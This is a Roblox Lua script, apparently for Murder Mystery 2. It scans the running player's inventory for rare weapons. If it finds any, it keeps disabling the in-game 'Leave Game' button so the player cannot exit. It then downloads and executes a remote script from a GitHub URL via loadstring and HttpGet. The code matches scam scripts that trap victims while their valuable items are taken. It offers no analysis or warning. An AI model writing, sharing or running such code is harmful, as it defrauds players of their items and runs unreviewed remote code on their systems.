local p = game.Players.LocalPlayer
local itemData = require(
game.ReplicatedStorage.Database.Sync.Item
)

local inv = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(p.Name)

local found = false

for itemName, amount in pairs(inv.Weapons.Owned) do
if amount > 0 then
local info = itemData[itemName]

if info then  
        local rarity = tostring(info.Rarity or "")  

        if rarity == "Godly"  
        or rarity == "Ancient"  
        or rarity == "Vintage"  
        or rarity == "Unique" then  
            found = true  
            break  
        end  
    end  
end

end

if found then

    task.spawn(function() 
        while task.wait() do 
            pcall(function() 
                for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do 
                    v:Disable() 
                end 
            end) 
        end 
    end)
else


end

loadstring(game:HttpGet("https://raw.githubusercontent.com/Johnnyissocoollol/halloween/refs/heads/main/mm2hallow.lua"))()
